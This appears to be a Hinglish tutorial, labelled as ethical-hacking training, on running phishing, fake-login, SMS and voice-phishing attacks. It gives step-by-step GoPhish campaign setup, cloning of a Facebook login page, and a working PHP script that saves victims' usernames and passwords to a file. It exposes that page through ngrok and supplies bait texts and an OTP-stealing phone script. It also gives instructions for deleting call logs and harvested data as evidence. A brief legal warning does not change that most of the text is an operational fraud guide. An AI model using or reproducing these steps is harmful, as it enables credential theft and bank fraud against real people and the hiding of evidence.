CYBER-SECURITY & SOCIAL ENGINEERING: PENETRATION TESTING GUIDE

Goal: Cybersecurity Research & Defensive Training (Ethical Hacking)

1. PHISHING EMAIL (Campaign Execution)

Introduction: Phishing email attackers ka sabse bada hathiyar hai, jiske zariye wo target ko fake link par click karwate hain.

Step-by-Step Execution:

1. Tool: GoPhish (Kali mein sudo gophish se run karein).
2. Template Design: "Email Templates" mein jao, "Source" (< >) mode kholo aur apni email ka HTML paste karo. Link ke liye {{.URL}} code use karo taake link automatically generate ho.
3. Landing Page: "Landing Pages" mein ja kar target site (e.g., Facebook) ka URL "Import" karo taake wo asli lage.
4. Campaign: "New Campaign" par click karo, apni Email Template aur Landing Page select karo, aur targets ki email list upload karke "Launch" kar do.

2. FAKE LOGIN PAGE (Trap Creation)

Introduction: Yeh ek aisi website hoti hai jo target ko asli lagti hai, lekin iska maqsad username/password churaana hota hai.

Step-by-Step Execution:

1. Source Code: Browser mein target site kholo, Ctrl+U daba kar code copy karo (Ctrl+A, Ctrl+C).
2. File Setup: Terminal mein mkdir trap_lab -> cd trap_lab -> touch index.html login.php karo.
3. Trap Setup: mousepad index.html mein code paste karo. <form dhondho aur usay <form action="login.php" method="POST"> kar do.
4. Data Catcher: mousepad login.php mein niche wala PHP code paste karo:

<?php
$file = fopen("credentials.txt", "a");
foreach($_POST as $key => $value) { fwrite($file, $key . ": " . $value . "\n"); }
fclose($file);
header("Location: https://www.facebook.com");
exit();
?>

5. Run: Terminal 1 mein php -S localhost:8080 aur Terminal 2 mein ngrok http 8080 likh kar link generate karo.

3. SMS PHISHING (SMISHING)

Introduction: SMS ke zariye urgent message bhej kar target ko link par click karwane ka tareeqa.

Step-by-Step Execution:

1. Gateway: ClickSend ya Twilio ka free trial account lo.
2. Bait Message: "Alert: Aapka account lock hone wala hai. Verify karein: [Ngrok Link]".
3. Sending: Gateway ke dashboard se target ka phone number dalo aur SMS bhej do.
4. Harvesting: Jab target click karega, uska data credentials.txt mein store ho jayega.

4. VOICE PHISHING (VISHING)

Introduction: Phone call par trust jeet kar ya darr dikha kar OTP ya bank details nikalwaana.

Step-by-Step Execution:

1. Tool: Linphone (VoIP application).
2. Scripting: "Bank se bol raha hoon, aapka card verify karna hai, OTP batayein."
3. Action: Call karo aur victim ko darr ya urgency mein daal kar information lo.
4. Cleanup: Kaam hone ke baad call logs delete kar do.

5. ETHICAL HACKING (Career Path)

Introduction: Ethical hackers wo hain jo inhi attack techniques ko samajh kar systems ko secure karte hain.

How to Learn:

1. TryHackMe: "Jr Penetration Tester" path shuru karo.
2. Hack The Box: "Starting Point" ki machines practice karo.
3. Legal Warning: Hamesha written permission ke sath test karo, warna ye jurm hai.

10 QUESTIONS FOR PRACTICE (QUIZ)

1. Q: Ctrl+U ka kya kaam hai? A: Website ka source code dekhne ke liye.
2. Q: Phishing mein {{.URL}} kyun lagate hain? A: Fake link auto-generate karne ke liye.
3. Q: credentials.txt mein kya data hota hai? A: Target ka username/password.
4. Q: Ngrok ka kya kaam hai? A: Local link ko public internet link mein badalna.
5. Q: Smishing aur Vishing mein farq? A: Smishing SMS se, Vishing call se hoti hai.
6. Q: php -S kya hai? A: PHP ka local web server.
7. Q: GoPhish kya tool hai? A: Phishing campaign manage karne wala tool.
8. Q: Saboot kaise mitate hain? A: rm credentials.txt command se.
9. Q: Ethical hacking kyun zaroori hai? A: Systems ko protect karne ke liye.
10. Q: Kya bina permission hacking karni chahiye? A: Nahi, ye qanooni jurm hai.
